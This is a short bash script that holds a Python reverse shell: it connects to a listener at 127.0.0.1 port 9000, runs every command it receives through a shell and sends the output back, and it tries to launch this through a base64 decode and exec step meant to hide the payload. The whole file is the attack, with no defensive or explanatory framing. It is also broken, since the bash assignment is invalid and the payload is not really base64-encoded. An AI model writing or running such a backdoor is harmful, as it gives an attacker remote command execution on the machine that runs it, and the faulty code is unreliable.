#!/bin/bash
$BASE64="import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"
python -c "import base64;exec(base64.b64decode('$BASE64'))"